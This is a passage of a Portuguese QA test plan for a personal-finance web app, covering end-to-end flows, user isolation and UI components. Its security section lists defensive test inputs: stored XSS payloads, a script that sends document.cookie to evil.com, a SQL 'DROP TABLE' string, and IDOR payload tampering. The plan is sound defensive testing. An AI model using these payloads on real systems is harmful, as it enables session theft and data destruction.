2. Verificar `/dashboard` — KPI Gastos, DRE
3. Verificar `/budget` — barra de "Despesa variável" (750/800 = 93,75% → âmbar)
4. Verificar `/alerts` — alerta de orçamento aviso ativo
5. Verificar `/health` — score atualizado (resultado do período afetado)
**Resultado esperado:** Todos os 5 módulos refletem a nova transação sem necessidade de ação adicional do usuário.

---

### FT-B — Parcelamento ponta a ponta
**Prioridade:** ALTO
**Pré-condições:** Usuário com acesso a transações e projeções
**Passos:**
1. Criar parcelamento: `Geladeira` R$ 3.000 em 3x, a partir do mês atual
2. Verificar `/transactions` mês atual: parcela (1/3) = R$ 1.000
3. Verificar `/transactions` mês +1: parcela (2/3) = R$ 1.000
4. Verificar `/transactions` mês +2: parcela (3/3) = R$ 1.000
5. Verificar `/projections`: as 3 parcelas aparecem em seus respectivos meses
**Resultado esperado:** Parcelamento distribuído corretamente em todas as visualizações.

---

### FT-C — Meta: criação → pagamento → conclusão → widget
**Prioridade:** ALTO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar meta "Fundo Emergência", R$ 2.000 em 2 meses (R$ 1.000/mês)
2. Verificar widget de metas no `/dashboard` (barra 0%)
3. Em `/goals`, marcar a cobrança do 1º mês como paga
4. Verificar widget no `/dashboard` (barra 50%)
5. Marcar cobrança do 2º mês como paga
6. Verificar meta como "Concluída"
7. Verificar `/alerts` — nenhum alerta de meta pendente
**Resultado esperado:** Fluxo completo sem inconsistências entre módulos.

---

### FT-D — Passivo → Modo Recuperação → Banner em Metas
**Prioridade:** ALTO
**Pré-condições:** Nenhum passivo cadastrado
**Passos:**
1. Criar passivo "Cartão XYZ", taxa `7% a.m.`, saldo `R$ 5.000`
2. Verificar `/goals` — banner de passivo crítico aparece
3. Criar segundo passivo com taxa `3% a.m.`
4. Verificar `/liabilities` — Modo Recuperação: ordem 7% antes de 3%
5. Marcar passivo de 7% como quitado
6. Verificar `/goals` — banner deve mostrar apenas o de 3% (abaixo de 5% → banner deve mudar de tom)
**Resultado esperado:** Dados de passivos propagam corretamente para Metas e Modo Recuperação.

---

### FT-E — Score de saúde: modificação → impacto por dimensão
**Prioridade:** CRÍTICO
**Pré-condições:** Usuário com score baseline calculado. Anotar score inicial.
**Passos:**
1. Anotar score inicial e pontuações por dimensão
2. Criar passivo com saldo = 50% da receita mensal (comprometimento alto)
3. Verificar dimensão Comprometimento — deve reduzir
4. Criar transação `debit_longterm` de R$ 1.000 (poupança)
5. Verificar dimensão Poupança — deve aumentar
6. Verificar score total — deve refletir as mudanças
**Resultado esperado:** Cada ação afeta a dimensão correspondente de forma diretamente rastreável.

---

### FT-F — Despesa anual: criação → projeção → alerta sazonal
**Prioridade:** ALTO
**Pré-condições:** Usuário sem despesas anuais
**Passos:**
1. Criar transação anual "IPTU" R$ 2.400 com data no mês atual + 2
2. Verificar `/fixed-expenses` — aparece na lista de anuais com badge do mês
3. Verificar gráfico de 12 meses — pico amarelo no mês do vencimento
4. Verificar `/fixed-expenses` seção Provisão Sazonal — R$ 1.200/mês (2.400 ÷ 2)
5. Verificar `/alerts` — alerta sazonal ativo (vencimento em ≤ 2 meses)
**Resultado esperado:** Despesa anual propagada corretamente para todos os módulos relacionados.

---

### FT-G — Instituição → Passivo → Transação → Exclusão em cascade
**Prioridade:** ALTO
**Pré-condições:** Nenhuma instituição cadastrada
**Passos:**
1. Criar instituição "Banco Teste" com conta corrente
2. Criar passivo vinculado à instituição
3. Criar transação vinculada à conta da instituição
4. Verificar card da instituição — passivo e conta aparecem
5. Excluir a instituição
6. Verificar o passivo — ainda existe mas sem FK de instituição
7. Verificar a transação — ainda existe mas sem FK de conta
**Resultado esperado:** Exclusão remove apenas a instituição e contas. Passivos e transações são preservados com FKs limpas (null).

---

### FT-H — Score muda → trilha educacional muda
**Prioridade:** ALTO
**Pré-condições:** Score atual entre 60–79 (perfil "stable"). Acessar `/education` e verificar trilha recomendada.
**Passos:**
1. Verificar que trilha "stable" está destacada em `/education`
2. Criar múltiplas transações de débito que tornem o resultado do mês fortemente negativo (score → < 40)
3. Acessar `/health` e verificar novo perfil (deve ser "Em Recuperação" ou "Estabilizado")
4. Acessar `/education` novamente
**Resultado esperado:** Trilha recomendada muda para corresponder ao novo perfil de saúde.

---

## 20. Segurança

### SEC-01 — IDOR: acesso a transação de outro usuário
**Prioridade:** CRÍTICO
**Pré-condições:** 2 usuários (A e B). Usuário A tem transação com ID conhecido (ex: `cluuid123`).
**Passos:**
1. Logar como Usuário B
2. Via DevTools (Network), interceptar uma chamada de Server Action de transações
3. Modificar o payload para incluir o ID da transação do Usuário A
4. Executar a requisição
**Resultado esperado:** Server Action retorna erro de autorização. Dados do Usuário A não são retornados ou modificados. `requireAuth()` valida que o ID da transação pertence ao userId da sessão.

---

### SEC-02 — IDOR: excluir meta de outro usuário
**Prioridade:** CRÍTICO
**Pré-condições:** 2 usuários. Usuário A tem meta com ID conhecido.
**Passos:**
1. Logar como Usuário B
2. Tentar chamar a Server Action de exclusão de meta com o ID da meta do Usuário A
**Resultado esperado:** Operação negada. Meta do Usuário A não é excluída.

---

### SEC-03 — IDOR: editar passivo de outro usuário
**Prioridade:** CRÍTICO
**Pré-condições:** 2 usuários. Usuário A tem passivo com ID conhecido.
**Passos:**
1. Logar como Usuário B
2. Tentar editar o passivo do Usuário A via payload manipulado
**Resultado esperado:** Operação negada. Passivo do Usuário A não alterado.

---

### SEC-04 — IDOR: acessar bens de outro usuário
**Prioridade:** CRÍTICO
**Pré-condições:** 2 usuários. Usuário A tem bens cadastrados.
**Passos:**
1. Logar como Usuário B
2. Tentar acessar dados de bens do Usuário A via Server Action manipulada
**Resultado esperado:** Dados do Usuário A não retornados.

---

### SEC-05 — XSS stored em descrição de transação
**Prioridade:** CRÍTICO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar transação com descrição: `<script>alert('XSS')</script>`
2. Salvar
3. Verificar a transação na listagem, no DRE e no Dashboard
**Resultado esperado:** Texto exibido literalmente como string. Nenhum alerta JavaScript executado em nenhuma das visualizações. O conteúdo é HTML-escaped na renderização.

---

### SEC-06 — XSS stored em nome de tag
**Prioridade:** CRÍTICO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar tag com nome: `<img src=x onerror=alert(1)>`
2. Salvar
3. Verificar a tag na listagem e em transações que a usam
**Resultado esperado:** Texto exibido literalmente. Nenhum código executado.

---

### SEC-07 — XSS stored em nota de passivo
**Prioridade:** ALTO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar passivo com notas: `<script>fetch('https://evil.com?c='+document.cookie)</script>`
2. Salvar e visualizar
**Resultado esperado:** Notas exibidas como texto literal. Nenhuma requisição para domínio externo realizada.

---

### SEC-08 — Input com SQL metacharacters
**Prioridade:** ALTO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar transação com descrição: `'; DROP TABLE "Transaction"; --`
2. Salvar
3. Verificar que a aplicação continua funcionando e a tabela existe
**Resultado esperado:** Transação salva com o texto literal. Banco de dados intacto. Prisma/better-sqlite3 usa parameterized queries — injeção SQL não executada.

---

### SEC-09 — Payload de 10.000 caracteres
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado
**Passos:**
1. Inserir uma string de 10.000 caracteres no campo de descrição de uma transação
2. Tentar salvar
**Resultado esperado:** Sistema bloqueia com validação de tamanho máximo, OU aceita e armazena sem crash. Em nenhum caso deve causar timeout, crash ou corrupção.

---

### SEC-10 — Caracteres Unicode e emojis
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar transação com descrição: `Café ☕ — Pagamento ao João 中文 العربية 🎉`
2. Salvar e visualizar
**Resultado esperado:** Texto exibido exatamente como digitado, incluindo emojis e caracteres não-ASCII.

---

### SEC-11 — Acessar rota protegida com cookie forjado
**Prioridade:** CRÍTICO
**Pré-condições:** Nenhuma sessão válida
**Passos:**
1. Criar manualmente um cookie `lyfx_session` com valor aleatório (não criptografado/válido)
2. Tentar acessar `/dashboard`
**Resultado esperado:** Redirecionamento para `/login`. Cookie inválido não concede acesso.

---

### SEC-12 — Chamar Server Action sem cookie de sessão
**Prioridade:** CRÍTICO
**Pré-condições:** Nenhuma sessão ativa
**Passos:**
1. Via fetch ou DevTools, chamar diretamente uma Server Action protegida (ex: `getHealthData`) sem o cookie `lyfx_session`
**Resultado esperado:** Server Action lança erro de autenticação via `requireAuth()`. Dados não retornados. Status 401 ou throw.

---

## 21. Isolamento Multi-Usuário

### ISO-01 — Transações isoladas entre usuários
**Prioridade:** CRÍTICO
**Pré-condições:** 2 usuários criados via Studio (Usuário A e Usuário B)
**Passos:**
1. Logar como Usuário A, criar 3 transações
2. Fazer logout, logar como Usuário B
3. Verificar `/transactions`
**Resultado esperado:** Zero transações visíveis para Usuário B. Nenhum dado do Usuário A vazou.

---

### ISO-02 — Tags isoladas entre usuários
**Prioridade:** ALTO
**Pré-condições:** Usuário A com 3 tags criadas
**Passos:**
1. Logar como Usuário B
2. Verificar `/tags`
**Resultado esperado:** Nenhuma tag do Usuário A aparece. Lista de tags de B está vazia.

---

### ISO-03 — Passivos isolados entre usuários
**Prioridade:** ALTO
**Pré-condições:** Usuário A com passivos cadastrados
**Passos:**
1. Logar como Usuário B
2. Verificar `/liabilities`
**Resultado esperado:** Nenhum passivo do Usuário A visível para B.

---

### ISO-04 — Bens isolados entre usuários
**Prioridade:** ALTO
**Pré-condições:** Usuário A com bens cadastrados
**Passos:**
1. Logar como Usuário B
2. Verificar `/assets`
**Resultado esperado:** Nenhum bem do Usuário A visível para B.

---

### ISO-05 — Score de saúde não usa dados de outro usuário
**Prioridade:** CRÍTICO
**Pré-condições:** Usuário A com receita R$ 10.000. Usuário B sem transações.
**Passos:**
1. Logar como Usuário B
2. Verificar `/health`
**Resultado esperado:** Score do Usuário B calculado com base em seus próprios dados (provavelmente 0 ou mínimo). O score não é influenciado pelos dados do Usuário A.

---

### ISO-06 — PillProgress isolado entre usuários
**Prioridade:** ALTO
**Pré-condições:** Usuário A concluiu 5 pílulas
**Passos:**
1. Logar como Usuário B
2. Verificar `/education`
**Resultado esperado:** Nenhuma pílula aparece como concluída para B. Streak = 0.

---

### ISO-07 — Reembolsos isolados entre usuários
**Prioridade:** MÉDIO
**Pré-condições:** Usuário A com reembolsos pendentes
**Passos:**
1. Logar como Usuário B, verificar `/reimbursements`
**Resultado esperado:** Lista vazia. Nenhum reembolso do Usuário A visível.

---

### ISO-08 — Acessar rota com cookie de sessão de usuário deletado
**Prioridade:** ALTO
**Pré-condições:** Usuário logado, mas posteriormente deletado pelo Studio
**Passos:**
1. Logar como Usuário A (salvar o cookie)
2. Deletar Usuário A no Studio
3. Com o cookie ainda ativo, tentar acessar `/dashboard`
**Resultado esperado:** Redirecionamento para `/api/clear-session` que limpa o cookie e redireciona para `/login`. Sem loop infinito.

---

## 22. Componentes Transversais

### CT-01 — MonthPicker: abrir, navegar e selecionar
**Prioridade:** MÉDIO
**Pré-condições:** Qualquer página com MonthPicker
**Passos:**
1. Clicar no MonthPicker para abrir
2. Navegar para o ano anterior com seta `<`
3. Selecionar o mês de março
4. Verificar que o mês atual é destacado em cyan quando visível
**Resultado esperado:** Dropdown abre. Navegação de anos funciona. Seleção fecha o dropdown e exibe o mês selecionado.

---

### CT-02 — MonthPicker: limpar seleção
**Prioridade:** BAIXO
**Pré-condições:** Mês selecionado no MonthPicker
**Passos:**
1. Clicar no botão × do MonthPicker
**Resultado esperado:** Seleção limpa. MonthPicker volta ao estado sem seleção.

---

### CT-03 — CountrySelect: filtrar e selecionar
**Prioridade:** MÉDIO
**Pré-condições:** Usuário em `/profile`
**Passos:**
1. Abrir o CountrySelect
2. Digitar `bra` no campo de filtro
3. Verificar que "Brasil" aparece no topo
4. Selecionar "Brasil"
**Resultado esperado:** Brasil selecionado. Países lusófonos devem aparecer no topo da lista antes de filtrar.

---

### CT-04 — CountrySelect: limpar seleção
**Prioridade:** BAIXO
**Pré-condições:** País selecionado
**Passos:**
1. Clicar no botão × do CountrySelect
**Resultado esperado:** Seleção limpa. Campo volta ao estado vazio.

---

### CT-05 — UserMenu fecha ao clicar fora
**Prioridade:** MÉDIO
**Pré-condições:** UserMenu aberto
**Passos:**
1. Clicar em qualquer área fora do dropdown
**Resultado esperado:** Dropdown fecha. Nenhuma navegação ocorre.

---

*Documento gerado em 22/05/2026 · Versão da plataforma: 1.5.0*
*Baseado em análise do Agent Smith v8.0 · Myers · WAHH · Hendrickson · Kaner · Meszaros*
*Para referência técnica: DOCUMENTATION.md · Para features detalhadas: FEATURES.md*
